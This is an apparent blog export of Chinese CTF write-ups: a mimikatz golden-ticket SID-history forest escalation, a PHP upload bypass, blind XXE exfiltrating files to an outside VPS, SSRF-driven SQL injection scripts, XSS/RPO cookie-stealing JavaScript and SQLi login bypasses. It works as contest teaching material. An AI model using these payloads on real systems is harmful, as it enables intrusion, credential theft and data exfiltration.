/dsgetdc:web.lctf.com 可以得到域控的hostname一切准备妥当后，我们可以尝试一下ms14-068拿子域域控1python goldenPac.py -dc-ip 172.21.0.7 -target-ip 172.21.0.7 web.lctf.com/buguake:&apos;xdsec@lctf2018&apos;@sub-dc getshell 父域-域控老规矩通过1ipconfig /all 可以得到父域域控的ip地址1172.17.0.10 收集父域域控的信息1nltest /dsgetdc:lctf.com 这里是本题重要的一个考点，修复了14-068，想拿父域域控需要设计到跨域渗透的问题。所以我们可以利用域信任关系的漏洞进行攻击参考资料http://www.4hou.com/technology/10049.html如文中提到1由于信任在Active Directory林中工作原理的原因，sidHistory属性（PAC中的“ExtraSids”）在林的域内比较重要，因为这些SID在“SID筛选”保护的跨域引用中未被滤除掉。因此，将其sidHistory 或 ExtraSids设置为“Enterprise Admins”SID（仅存在于林根中的域用户组）的子域中的任何用户将有效地工作，就好像他们是企业管理员一样。正如微软已经知道这是一个问题，而且至少从 2005年的ITPro Windows文章以及几乎可以肯定之前的知识已经完全公开，sidHistory 是一个非常难以修改的受保护的属性。 我们可以通过设置一个用户的sidHistory 或 ExtraSids为“Enterprise Admins”SID，也就是企业管理员组的SID(企业管理员组由每个域的域管组成),这样当我们尝试访问一个新的资源时，如果SID或SID历史记录匹配，则根据ACL中指定的访问权限授予我们访问权限。那么我们应该如何伪造这个sid history呢，这里我们就用到了黄金票据（一种有效的TGT Kerberos票据，因为它是由域Kerberos帐户（KRBTGT）加密和签名的）的原理，只要我们能获得域账户krbtgt的hash值，便可以对其任意域用户的sid history进行操控。参考链接:https://www.cnblogs.com/backlion/p/8127868.html获取子域和父域的sid获取子域控krbtgt的密码hash值1kerberos::golden /admin:administrator /domain:web.lctf.com /sid:S-1-5-21-508737280-3758319117-1445457868 /sids:S-1-5-21-35370905-2178818314-1839806818-519 /krbtgt:42cb5299c2e40ad7d04cb2d7d16f3a46 /startoffset:0 /endin:600 /renewmax:10000 /ptt 查看票证是否注入成功 flag就在父域域控的桌面上]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[由一道CTF题目引发的思考]]></title>
    <url>%2F%E7%94%B1%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83.html</url>
    <content type="text"><![CDATA[从一个非预期谈起开局先挂连接https://blog.zsxsoft.com/post/36这里zsx师傅使用了上传index.php/.+条件竞争的方法getshell真的让人眼前一亮，尤其是对于我这种连index.php/.这种绕过方法都不甚了解的菜鸡，于是在仔细google了一番，终于在wonderkun师傅的博客里找到了这种绕过方式的介绍http://wonderkun.cc/index.html/?p=626(其实这篇文章当时自己也看过，现在却完全想不起来T T)作者在文章后半段提到了利用1.php/.可以绕过后缀黑名单检测，但却不能覆盖文件。随后列出了相关的源码调用，阐述了问题形成的原因。这里我就不赘诉了。但是作者这里用的是file_put_content函数，而我们的问题是move_uploaded_file函数，这两个函数能相提并论么。其实这个问题P总在以前的小密圈里提到过，因为俩个函数都是文件读写类函数，都是需要打开文件流的，所以底层都会调用一个叫做tsrm_realpath的函数来将filename标准化为一个绝对路径1234567891011121314151617181920212223i = len; // i的初始值为字符串的长度 while (i &gt; start &amp;&amp; !IS_SLASH(path[i-1])) &#123; i--; // 把i定位到第一个/的后面 &#125; if (i == len || (i == len - 1 &amp;&amp; path[i] == '.')) &#123; len = i - 1; // 删除路径中最后的 /. , 也就是 /path/test.php/. 会变为 /path/test.php is_dir = 1; continue; &#125; else if (i == len - 2 &amp;&amp; path[i] == '.' &amp;&amp; path[i+1] == '.') &#123; //删除路径结尾的 /.. is_dir = 1; if (link_is_dir) &#123; *link_is_dir = 1; &#125; if (i - 1 &lt;= start) &#123; return start ? start : len; &#125; j = tsrm_realpath_r(path, start, i-1, ll, t, use_realpath, 1, NULL TSRMLS_CC); // 进行递归调用的时候，这里把strlen设置为了i-1， 所以move_uploaded_file和file_put_content都会递归删除文件名最后的/.导致绕过了后缀名检测。按理说故事到这里就该结束了，可是直到有一天我进入了土师傅的博客… 半路杀出个程咬金继续挂链接https://www.lorexxar.cn/2018/04/05/0ctf2018-other/看到这里的时候我就震惊了，index.php/.居然可以覆盖文件？？？，我前几天才看的文章是假的吧..index.php/.不是不可以覆盖文件么，我还本地测试过。于是怀着半信半疑的心情去测试了一下，很快发现了问题。当我使用index.php/.是不可以覆盖的，但是使用x/../index.php/.就可以覆盖了，这一下勾起了我的好奇心，但是想弄懂这个问题，咱们还是得回到底层。 站在巨人的肩膀上回到开头zsx师傅的连接，作者在文章里也从底层提到了问题的所在这里的rename之所以会报错是因为这个函数并不会调用tsrm_realpath,导致当我们传入一个包含/.为后缀的文件时会出错我们本地测试一下123&lt;?phprename('test.php','test.php/.');?&gt; 我们先抛开这道题，这里关键问题也就像zsx师傅在博客里说的那样lstat如果判断文件存在后就不打开文件了，而这个函数在linux下其实是有问题的，因为他会逐层解析php代码，一旦遇到不存在路劲他就会返回一个warning,导致move_uploaded_file认为这个文件不存在也就可以写入，最终达到了覆盖的效果，我们可以测试一下lstat的功能12&lt;?phpprint_r(lstat($_GET['test'])); ok，现在我们在回到这题来，我们用strace动态调试一下php，分别发送两个包1发送name=index.php/. 1发送name=x/../index.php/. 很明显当传入name=x/../index.php/.的时候lstat的返回结果为-1，即不存在这个文件。这时候write函数就会继续执行从而将原内容覆盖。 来个小结现在看来，php还有很多的文件操作函数存在问题，譬如今年跨年夜p总小密圈发的php文件读写函数这类需要打开文件流(file_put_content)与php判断文件属性这种无需打开文件流函数(unlink,file_exists)之间的区别以及围着这点展开的一系列问题。但是本质可能也就是一两个底层函数的问题，所以在这里也希望自己以后遇到问题不要嫌麻烦，多动手试试才能出真知。El psy congroo]]></content>
      <categories>
        <category>learning and think</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[强网杯教育机构的培训平台writeup]]></title>
    <url>%2Fqiangwangbei2.html</url>
    <content type="text"><![CDATA[教育机构的培训平台这题比赛的时候好像是0解，赛后趁着题目没关各种踩坑后后才做出来…给了域名一打开发现未备案，那就用ip访问呗，先按照常规渗透思路来，查了下whois发现开了隐私保护，nmap扫了下端口发现还开了22和33899。总不可能是22端口爆破吧，那么访问33899端口。咋一看好像跟80端口的一样，然而在邮件页面却有不同。浏览了一会发现站点输入点不多就一个发邮件功能测试了一下发现80端口的发邮件功能好像并没有什么卵用，于是开始主攻33899端口。。测试了xss和sql注入无果后随手打个xxe发现出现xml报错那么很明显是个blind xxe漏洞了，但是一番测试后怎么都收不到请求，猜想像以前08067ctf那样过滤了实体引用，于是把实体引用定义在了dtd里，果然收到了请求,payload1234567891011xml&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % dtd SYSTEM "yourvpsip/evil.dtd"&gt;%dtd;]&gt;&lt;root/&gt;dtd&lt;!ENTITY % file SYSTEM "php://filter/read=/convert.base64-encode/resource=/etc/passwd"&gt;&lt;!ENTITY % all "&lt;!ENTITY &amp;#37; send SYSTEM 'http://yourvpsip/?file=%file;'&gt;"&gt;%all;%send; 那么我们尝试用伪协议读一下源码，发现没有价值的信息，改下dtd读一下config.php123456789101112131415161718192021&lt;?php//error_reporting(E_ALL^E_NOTICE^E_WARNING);error_reporting(E_ERROR | E_WARNING | E_PARSE);define(BASEDIR, "/var/www/52dandan.club/");define(FLAG_SIG, 1);define(SECRETFILE,'/var/www/52dandan.com/public_html/youwillneverknowthisfile_e2cd3614b63ccdcbfe7c8f07376fe431');//global $error_msg;$DBHOST = "127.0.0.1";$DBUSER = "root";$DBPASS = "QWB2018qwb@)!*";//$DBPASS = "";$DBNAME = "QWB1234";$mysqli = @new mysqli($DBHOST, $DBUSER, $DBPASS, $DBNAME,3306);if(mysqli_connect_errno())&#123; echo "no sql connection!!!".mysqli_connect_error(); $mysqli=null; die();&#125;?&gt; 得到flag第一部分15bdd3b0ba1fcb40 找了一圈后没找到第二部分于是开始内网渗透，首先根据提示arp -a联想到读取arp表，于是尝试读取proc/net/arp发现出错但是并不是文件不存在报的错，于是猜想是没有权限或者文件太大无法读取，在网上搜索了一番后找到了一种用zlib压缩数据的方法1php://filter/read=zlib.deflate/convert.base64-encode/resource=/proc/net/arp 打了一下后成功读取到数据，然后用脚本还原一下即可出数据12345678910&lt;?php$str = file_get_contents('./flag.txt');$str = str_replace(" ","+",$str);function decode($str)&#123; $str = base64_decode($str); $str = gzinflate($str); return $str;&#125;print_r(decode($str));?&gt; 然后尼玛给了一堆ip…1IP address HW type Flags HW address Mask Device 192.168.223.127 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.144 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.17 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.143 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.125 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.158 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.161 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.141 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.156 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.139 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.154 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.134 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.137 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.152 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.132 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.151 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.130 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.149 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.18 0x1 0x2 02:42:c0:a8:df:12 * eth0 192.168.223.128 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.126 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.147 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.1 0x1 0x2 02:42:91:f9:c9:d4 * eth0 192.168.223.142 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.145 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.160 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.140 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.159 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.138 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.157 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.136 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.155 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.135 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.150 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.153 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.133 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.148 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.131 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.146 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.129 0x1 0x0 00:00:00:00:00:00 * eth0 随便访问一个发现返回没有该主机，猜测是静态写入了一堆垃圾数据，然后里面有一个应该是真正的内网地址。所以写了个脚本（这里简单介绍一下脚本的思路，因为是内网环境，脚本并不是那么好写，大致思路是在服务器上写一个脚本挂在服务器上一边动态修改dtd文件一边发包)得出192.168.223.18是真实内网地址123456789101112131415161718192021222324252627import requestsurl = 'http://39.107.33.75:33899/common.php's = requests.Session()result = ''data = &#123;"name":"pupiles","email":"ssadasdasd@gmail.com","comment":"""&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;!DOCTYPE root [ &lt;!ENTITY % dtd SYSTEM "http://52.199.13.19/evil.dtd"&gt; %dtd;]&gt; &lt;root/&gt;""" &#125;with open('ip.txt', 'r') as f: ip = f.read().split('\n') for i in range(40): f = open('./evil.dtd','w') payload2 = """&lt;!ENTITY % file SYSTEM "http://&#123;&#125;"&gt; &lt;!ENTITY % all "&lt;!ENTITY &amp;#37; send SYSTEM 'http://52.199.13.19/?file=%file;'&gt;"&gt; %all; %send;""".format(ip[i]) f.write(payload2) f.close() print payload2 r = s.post(url,data=data) #print r.contetn if "No route to host in" not in r.content: print ip[i] break 这时候发现这个ip的主页同样由于数据过大无法直接返回，这里又踩了一个坑，按理说这里是要读内网的文件应该不能用php伪协议了吧，然而尝试了各种方法无果后回到最初的方法1php://filter/read=zlib.deflate/convert.base64-encode/resource=http://192.168.223.18/ 发现居然真的可以，原因是内网服务开启了url_open，但是发现index.html主页并没有flag，于是尝试爆破路径发现一个test.php，尝试读取后返回结果如下1I Love DanDanOnline Shop System Testing!!!Our online sales system is coming soon.Now open the test interface to internal employees!!!This time is the last testing before online!!!So this time,we test the query and search interface at once !!!!start testing~~~~your goods&apos;s name is &apos;&apos;,your goods&apos;s price is &apos;&apos;,your goods&apos;s quantity is &apos;&apos;,your goods&apos;s total is &apos;&apos;,testing finish~~~~ 刚看到这里的时候我一定是脑残了才会去以为是隐写，明显的传参数TT，于是接着爆破参数，尝试了各种参数id,name,price,quantity,total无果后仔细理解了一下原文意思，大致是这个参数要包含商品的名字，价格和总价，于是猜测不是good就是shop，结果发现是shop，然后尝试注入，到这里才算是真正入坑，因为内网实在不方面测试sql盲注，而且还过滤了一堆字符，肝了好久实在肝不出来(发现好多大师傅都卡这了)。最后实在没办法去问了出题人，出题人给了我一个白名单1$whitelist = &quot; `\&quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;()_.+-&apos;&quot; 过滤了,=等关键字符，还好没有过滤关键词，一番fuzz后找到一个可用的payload1php://filter/read=zlib.deflate/convert.base64-encode/resource=http://192.168.223.18/test.php?shop=3&apos;-(case%a0when((select%a0database())like%a0binary(&apos;________&apos;))then(0)else(1)end)-&apos;1 剩下就是写脚本盲注，flag第二部分在total字段里1bbf344452165c1471 payload12345678910111213141516171819202122232425262728293031import requestsurl = 'http://39.107.33.75:33899/common.php's = requests.Session()result = ''data = &#123;"name":"pupiles","email":"ssadasdasd@gmail.com","comment":"""&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;!DOCTYPE root [ &lt;!ENTITY % dtd SYSTEM "http://52.199.13.19/evil.dtd"&gt; %dtd;]&gt; &lt;root/&gt;""" &#125;#p1 = 'database()'#p2 = 'select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where table_schema%a0like%a0'qwbinner''#p3 = 'select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name%a0like%a0'albert_shop''for i in range(0,28): for j in range(48,123): f = open('./evil.dtd','w') payload2 = """&lt;!ENTITY % file SYSTEM "php://filter/read=zlib.deflate/convert.base64-encode/resource=http://192.168.223.18/test.php?shop=3'-(case%a0when((select%a0group_concat(total)%a0from%a0albert_shop)like%a0binary('&#123;&#125;'))then(0)else(1)end)-'1"&gt; &lt;!ENTITY % all "&lt;!ENTITY &amp;#37; send SYSTEM 'http://52.199.13.19/?file=%file;'&gt;"&gt; %all; %send;""".format('_'*i+chr(j)+'_'*(27-i)) f.write(payload2) f.close() print 'test &#123;&#125;'.format(chr(j)) r = s.post(url,data=data) #print r.contetn if "Oti3a3LeLPdkPkqKF84xs=" in r.content and chr(j)!='_': result += chr(j) print chr(j) breakprint result 注意用这个payload的时候要先猜长度123456for i in range(1,30): f = open('./evil.dtd','w') payload2 = """&lt;!ENTITY % file SYSTEM "php://filter/read=zlib.deflate/convert.base64-encode/resource=http://192.168.223.18/test.php?shop=3'-(case%a0when((select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name%a0like%a0'albert_shop')like%a0binary('&#123;&#125;'))then(0)else(1)end)-'1"&gt; &lt;!ENTITY % all "&lt;!ENTITY &amp;#37; send SYSTEM 'http://52.199.13.19/?file=%file;'&gt;"&gt; %all; %send;""".format('_'*i) 综上所诉，flag为1QWB&#123;5bdd3b0ba1fcb40bbf344452165c1471&#125;]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[强网杯-writeup]]></title>
    <url>%2Fqiangwangbei.html</url>
    <content type="text"><![CDATA[强网杯WP赶个头条，写的比较粗略，各位师傅别嫌弃哈MISC 签到签到得flag welcome这题下载下来一个bmp文件，尝试最低位隐写无果后，尝试offset，最后在offset600多位后找到flag WEB web签到第一层12345&lt;!-- if($_POST['param1']!=$_POST['param2'] &amp;&amp; md5($_POST['param1'])==md5($_POST['param2']))&#123; die("success!"); &#125;--&gt; 这里可以用2个字符串绕过1param1=240610708&amp;param2=QNKCDZO 第二层12345&lt;!-- if($_POST['param1']!==$_POST['param2'] &amp;&amp; md5($_POST['param1'])===md5($_POST['param2']))&#123; die("success!"); &#125;--&gt; 使用了强等于，那么使用数组绕过1param1[]=1&amp;param2[]=2 第三层 12345&lt;!-- if((string)$_POST['param1']!==(string)$_POST['param2'] &amp;&amp; md5($_POST['param1'])===md5($_POST['param2']))&#123; die("success!); &#125;--&gt; 使用了强制字符串转化一番谷歌后发现这是去年BKPCTF改的一道题payload如下:123Param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2Param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 Share your mind这题必须要写一下自己的踩坑经历，首先进去浏览一下页面功能，有个提交bug页面的地方，还有个可以新建文章的地方最后就是浏览文章(但是只能浏览自己发的文章)，首先想到的就是xss+csrf，新建一个文章引用一段JS然后发给bot，然后ajax请求admin的文章发回来。可是按照这个思路我们发现在新建文章页面我们的&lt;&gt;被过滤了，所以我们不能直接构造一个js。猜想能不能在report页面里进行xss，但是发现存在过滤，只能像自己网站的地址发起请求，但是”居然”可以绕过!!!!!!,payload:1http://39.107.33.96:20000/index.php/report/&lt;script src=&quot;xxxxxx.com&quot;&gt;&lt;/script&gt; 于是无尽的踩坑之旅开始了，首先是bot返回结果没有cookie，一开始也没在意以为设置了httponly,(后来大致明白bot过程了,先check url-未读,然后add_cookie-已读，这里直接用&lt;script&gt;标签其实是在add_cookie之前就返回了所以不带cookie)让他AJAX请求访问admin的文章，代码如下12345var a = new XMLHttpRequest();a.open('GET', 'index.php/view/article/1', false);a.send(null);b = a.responseText;(new Image()).src = 'http://xxxxx/?flag=' + escape(b); 结果bot返回结果是未登录，然后我就很懵逼，后来给了hint1:phantomjs/2.1.1结果这提示给了以后我就以为是日bot，各种谷歌找2.1.1的漏洞，一直到下午出了hint2:漏洞点不在report…推翻了一个下午的努力成果。一直到晚上我才想起来index页面有一个../static/js/bootstrap.min.js的相对路径引用想起来寒假时候看的rpo，关于rpo的原理这里不想赘述了，给个连接https://open.appscan.io/article-462.html这里文章查看页面没有引用DOCTYPE html，所以存在rpo漏洞,新建一个文章,文章title为空(title不为空的时候会添加一个&lt;h1&gt;标签导致浏览器解析js的时候报错内容输入js代码比如alert(1)然后访问这1http://39.107.33.96:20000/index.php/view/article/635/..%2f..%2f..%2f..%2findex.php 把635替换成你的文章代码,这里对于服务器来说访问的是1http://39.107.33.96:20000/index.php 但是对于浏览器来说他访问的就是1http://39.107.33.96:20000/index.php/view/article/635/..%2f..%2f..%2f..%2findex.php 然后这个时候浏览器会发起js请求去请求原本index.php会加载的../static/js/bootstrap.min.js就是向1http://39.107.33.96:20000/index.php/view/article/635/..%2f..%2f..%2f..%2findex.php/../static/js/bootstrap.min.js 相当于1http://39.107.33.96:20000/index.php/view/article/635/static/bootstrap.min.js 这里访问的结果和访问1http://39.107.33.96:20000/index.php/view/article/635/ 也就是你的文章的内容是一样的(不明白的可以自己本地测试)，不同的是浏览器是以js引擎去解析你的文章的，也就是会把你的文章当成一段js去执行。所以这里就可以绕过&lt;&gt;的过滤执行xss了。所以我们新建一个文章内容为123var a = new XMLHttpRequest();a.open(&apos;GET&apos;, &apos;yourvpsip&apos;, false);a.send(null); 然后用浏览器访问1http://39.107.33.96:20000/index.php/view/article/22957/..%2f..%2f..%2f..%2findex.php 然后这里发现居然没有发起请求，查看源码发现是过滤了&quot;和&#39;，然后我就自作聪明的用反引号，然后我就陷入了无尽的玄学道路，我发现本地浏览器，vsp就可以收到请求但是提交给bot就收不到请求，然后我就一直在这里卡了超级长的时间，期间还问了出题人,bot等问题…直到晚上用String.fromCharCode才解决了这个玄学问题(这个点真心卡了我好久),后面就比较简单了收到请求后发现cookie有提示联想到国赛的一道读取子目录cookie的题目https://www.lorexxar.cn/2017/07/11/guosai2017/脚本拿来改了改就可以get子目录cookie了1234567891011var iframe = document.createElement("iframe");iframe.src = "/QWB_f14g/QWB";iframe.id = "frame";document.body.appendChild(iframe);iframe.onload = function ()&#123; var c = document.getElementById('frame').contentWindow.document.cookie; var n0t = document.createElement("link"); n0t.setAttribute("rel", "prefetch"); n0t.setAttribute("href", "//xxx/?" + c); document.head.appendChild(n0t);&#125; 然后把所有引号之间的内容用String.fromcode()编码一下 Three hit进去后发现功能很少，猜测二次注入，发现username有正则限制，那么测试age，发现必须整数，这里可以用16进制绕过，测试一番后发现是个盲注找了个脚本改了下1234567891011121314151617181920212223242526272829303132import requestsimport binasciiurl_register = "http://39.107.32.29:10000/index.php?func=register"url_login = "http://39.107.32.29:10000/index.php?func=login"result = '[*]result:'for i in range(1, 65): for j in range(32, 127): age = "1223 or ascii(substr((select flag from flag limit 1),&#123;0&#125;,1))=&#123;1&#125;#".format(str(i), str(j)) age = binascii.hexlify(bytes(age, 'utf8')) age = "0x" + str(age, "utf8") username = "pupiles&#123;0&#125;&#123;1&#125;".format(str(i), str(j)) data = &#123; "username": username, "password": "123456", "age": age &#125; while True: try: resp1 = requests.post(url=url_register, data=data, allow_redirects=False) break except Exception as e: continue while True: try: resp2 = requests.post(url=url_login, data=data, allow_redirects=True) if "&lt;a&gt;123&lt;/a&gt;" in resp2.text: result += chr(j) print(result) break except Exception as e: continue 盲注跑出flag Python is the best language 1一道flask审计题页面功能大致有个留言功能，猜测是xss或者sql注入，直接定位代码关键部分123class PostForm(FlaskForm): post = StringField('Say something', validators=[DataRequired()]) submit = SubmitField('Submit') 这里直接接受post参数,然后查看是如何添加到数据库的1234form = PostForm() if form.validate_on_submit(): res = mysql.Add("post", ['NULL', "'%s'" % form.post.data, "'%s'" % current_user.id, "'%s'" % now()]) 跳转到Add定义处1234567891011def Add(self, tablename, values): sql = "insert into " + tablename + " " sql += "values (" sql += "".join(i + "," for i in values)[:-1] sql += ")" try: self.db_session.execute(sql) self.db_session.commit() return 1 except: return 0 看到这里发现并有进行任何过滤，存在一个insert注入payload1123456&apos;,1,&apos;2018-03-24T21:44:39Z&apos;),(NULL,(select conv(hex(substr(load_file(&apos;/etc/passwd&apos;),1,6)),16,10)),2,&apos;2018-03-24T21:44:39Z&apos;)# 会返回数据库信息，当时忘记截图,然后我发现这题有个bug，就是flag必须要从留言板中回显，也就是说你能看到别人也能看到。导致后面好多队伍直接从留言板获得了flag 赛后总结怎么说呢，这次比赛题目质量非常的好，同时也让我学到非常多的东西，首先就是那道rpo题目，在那个反引号无法过滤的点我卡了将近有3个小时时间，其实我当时如果下载个phantomjs自己跑的话可能一会就能查出问题，说白了以后做CTF绝对不能懒，该搭建的环境一定要搭。还有遇到自己不会的知识点千万不能放弃，就像这次的flask1，其实是一个很简单的注入，对于flask的理解其实并不是很高，只要学习个几个小时就足以应付这道题，所以对于这道题来说不会flask并不是做不出来的理由，这就表示我们不能总是把希望寄托于CTF竞赛中总会出我们见过的套路，善于学习才是提高CTF竞赛能力的最快捷径。最后就是和协会小伙伴们一起打比赛的感觉真的很开心,还是那句话,重要的是过程不是结果。]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[secconctf-writeup]]></title>
    <url>%2Fsecconctf.html</url>
    <content type="text"><![CDATA[比赛的时候正好有点事，于是赛后复现喽 Log search这题登陆进去给了一个搜索框，结合提示应该是考察谷歌黑客语法，先尝试搜索flag，发现返回了好多页面不过全是404)那么结合1flag AND response:200 )得到包含flag的页面，访问得到flag1SECCON&#123;N0SQL_1njection_for_Elasticsearch!&#125; sqlsrf题目描述是叫你给root发一份给我flag的邮件。这题一开始进去给了3个文件，backup给了index.cgi的源码，那不管我们先看一下12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/perluse CGI;my $q = new CGI;use CGI::Session;my $s = CGI::Session-&gt;new(undef, $q-&gt;cookie('CGISESSID')||undef, &#123;Directory=&gt;'/tmp'&#125;);$s-&gt;expire('+1M'); require './.htcrypt.pl';my $user = $q-&gt;param('user');print $q-&gt;header(-charset=&gt;'UTF-8', -cookie=&gt; [ $q-&gt;cookie(-name=&gt;'CGISESSID', -value=&gt;$s-&gt;id), ($q-&gt;param('save') eq '1' ? $q-&gt;cookie(-name=&gt;'remember', -value=&gt;&amp;encrypt($user), -expires=&gt;'+1M') : undef) ]), $q-&gt;start_html(-lang=&gt;'ja', -encoding=&gt;'UTF-8', -title=&gt;'SECCON 2017', -bgcolor=&gt;'black'); $user = &amp;decrypt($q-&gt;cookie('remember')) if($user eq '' &amp;&amp; $q-&gt;cookie('remember') ne '');my $errmsg = '';if($q-&gt;param('login') ne '') &#123; use DBI; my $dbh = DBI-&gt;connect('dbi:SQLite:dbname=./.htDB'); my $sth = $dbh-&gt;prepare("SELECT password FROM users WHERE username='".$q-&gt;param('user')."';"); $errmsg = '&lt;h2 style="color:red"&gt;Login Error!&lt;/h2&gt;'; eval &#123; $sth-&gt;execute(); if(my @row = $sth-&gt;fetchrow_array) &#123; if($row[0] ne '' &amp;&amp; $q-&gt;param('pass') ne '' &amp;&amp; $row[0] eq &amp;encrypt($q-&gt;param('pass'))) &#123; $s-&gt;param('autheduser', $q-&gt;param('user')); print "&lt;scr"."ipt&gt;document.location='./menu.cgi';&lt;/script&gt;"; $errmsg = ''; &#125; &#125; &#125;; if($@) &#123; $errmsg = '&lt;h2 style="color:red"&gt;Database Error!&lt;/h2&gt;'; &#125; $dbh-&gt;disconnect();&#125;$user = $q-&gt;escapeHTML($user);print &lt;&lt;"EOM";&lt;!-- The Kusomon by KeigoYAMAZAKI, 2017 --&gt;&lt;div style="background:#000 url(./bg-header.jpg) 50% 50% no-repeat;position:fixed;width:100%;height:300px;top:0;"&gt;&lt;/div&gt;&lt;div style="position:relative;top:300px;color:white;text-align:center;"&gt;&lt;h1&gt;Login&lt;/h1&gt;&lt;form action="?" method="post"&gt;$errmsg&lt;table border="0" align="center" style="background:white;color:black;padding:50px;border:1px solid darkgray;"&gt;&lt;tr&gt;&lt;td&gt;Username:&lt;/td&gt;&lt;td&gt;&lt;input type="text" name="user" value="$user"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Password:&lt;/td&gt;&lt;td&gt;&lt;input type="password" name="pass" value=""&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;&lt;input type="checkbox" name="save" value="1"&gt;Remember Me&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2" align="right"&gt;&lt;input type="submit" name="login" value="Login"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;EOM1; perl审计，对于perl我是一点都没学过的，但是这个代码还是很好理解的，首先从参数中获得了user，放入sqlite数据库中查询密码，如果查询的密码等于加密后传入的pass参数就通过校验，前面那个很好绕过，用一般的套路就可以1&apos; union select xxxxx--+ 但是我们不知道passwd加密后的值，所以再读读代码，发现一处可利用的点12345print $q-&gt;header(-charset=&gt;'UTF-8', -cookie=&gt; [ $q-&gt;cookie(-name=&gt;'CGISESSID', -value=&gt;$s-&gt;id), ($q-&gt;param('save') eq '1' ? $q-&gt;cookie(-name=&gt;'remember', -value=&gt;&amp;encrypt($user), -expires=&gt;'+1M') : undef) ]), 如果勾选了保存密码这里就会把加密后的$user变量注入进了cookie中的remember参数中，如此我们加密的$user变量就可见了。所以注册一个pupiles用户，查看返回的cookie)1remember=f7d1e331621ba4b15527e8cd1c62ec55; path=/; expires=Thu, 11-Jan-2018 16:41:24 GMT 所以提交12用户名为&apos; union select &apos;f7d1e331621ba4b15527e8cd1c62ec55&apos;--+密码为pupiles 成功登陆)登陆后发现有个netstat功能，可以查看开放的端口，然后还有一个wget功能，但是发现不是admin不能使用,所以我们要想办法弄出管理员的密码，这时候需要用到盲注，我们在user处尝试如下payload123&apos; union select xxxxx AND 1=1--+&apos; union select xxxxx AND 1=2--+//Login Error! 所以我们根据返回值就可以进行盲注payload1&apos; union select xxxx from users where username=&apos;admin&apos; and substr(password,&#123;&#125;,1)=&#123;&#125; 这样可以注入出admin密码，但是是加过密的，利用前面1$user = &amp;decrypt($q-&gt;cookie(&apos;remember&apos;)) if($user eq &apos;&apos; &amp;&amp; $q-&gt;cookie(&apos;remember&apos;) ne &apos;&apos;); 